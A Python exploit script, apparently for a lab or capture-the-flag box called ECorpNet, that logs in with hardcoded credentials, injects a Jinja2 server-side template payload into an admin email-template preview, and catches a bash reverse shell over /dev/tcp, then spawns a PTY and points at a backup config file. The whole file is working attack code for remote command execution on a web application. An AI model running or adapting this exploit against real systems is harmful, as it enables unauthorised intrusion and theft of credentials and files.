#!/usr/bin/env python3
"""ECorpNet: one-shot reverse shell for testing (stage 1 -> ecorpnet).

Logs in as pprice/bowwow, sends the SSTI payload to the template preview
and catches the shell itself. No nc needed. Standard library only.

    python3 revshell.py                       # target 192.168.50.116, port 4444
    python3 revshell.py -t 192.168.50.116 -p 9001 --lhost 192.168.50.41
"""
import argparse, http.cookiejar, os, re, select, socket, sys, threading, time
import urllib.parse, urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("-t", "--target", default="192.168.50.116", help="host[:port]")
ap.add_argument("-p", "--port", type=int, default=4444)
ap.add_argument("--lhost", help="your IP as seen from the box (auto-detected by default)")
ap.add_argument("--user", default="pprice")
ap.add_argument("--password", default="bowwow")
ap.add_argument("--tpl", type=int, default=1, help="email template id")
a = ap.parse_args()

host, _, wport = a.target.partition(":")
BASE = f"http://{a.target}"
if not a.lhost:  # the source address the kernel would use to reach the target
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((host, int(wport or 80)))
    a.lhost = s.getsockname()[0]
    s.close()

jar = http.cookiejar.CookieJar()
web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def get(path):
    return web.open(BASE + path, timeout=10).read().decode()

def post(path, data, timeout=10):
    return web.open(BASE + path, urllib.parse.urlencode(data).encode(), timeout=timeout).read().decode()

def csrf(html):
    m = re.search(r'name="csrf_token" value="([^"]+)"', html)
    if not m:
        sys.exit("[-] csrf_token not found (is the app up?)")
    return m.group(1)

# 1. listener first, so the callback can't arrive before we're ready
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", a.port))
srv.listen(1)
print(f"[*] listening on {a.lhost}:{a.port}")

# 2. log in as admin
html = post("/login", {"username": a.user, "password": a.password, "csrf_token": csrf(get("/login"))})
if "Invalid username or password" in html:
    sys.exit(f"[-] login failed for {a.user}")
print(f"[+] logged in as {a.user}")

# 3. SSTI in the preview; the trailing & keeps the HTTP request from hanging
cmd = f"bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.port} 0>&1' </dev/null >/dev/null 2>&1 &"
body = "{{ lipsum.__globals__.os.popen(%r).read() }}" % cmd
path = f"/admin/comms/{a.tpl}"
tok = csrf(get(path))
def fire():
    try:
        post(path, {"name": "welcome_new_hire", "subject": "Test", "body": body,
                    "button": "preview", "csrf_token": tok}, timeout=15)
    except Exception as e:
        print(f"[!] preview request: {e}")
threading.Thread(target=fire, daemon=True).start()
print("[+] payload sent, waiting for callback...")

srv.settimeout(15)
try:
    conn, peer = srv.accept()
except socket.timeout:
    sys.exit("[-] no callback in 15s: check --lhost and that the box can reach you on this port")
print(f"[+] shell from {peer[0]}. Try: id; cat /etc/ecorpnet/backup.conf  (Ctrl+D to quit)\n")

# 4. upgrade to a PTY right away (needed for su), then relay stdin <-> socket
conn.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n")
try:
    while True:
        r, _, _ = select.select([conn, sys.stdin], [], [])
        if conn in r:
            data = conn.recv(4096)
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
        if sys.stdin in r:
            line = os.read(sys.stdin.fileno(), 4096)
            if not line:
                break
            conn.sendall(line)
except KeyboardInterrupt:
    pass
print("\n[*] closed")
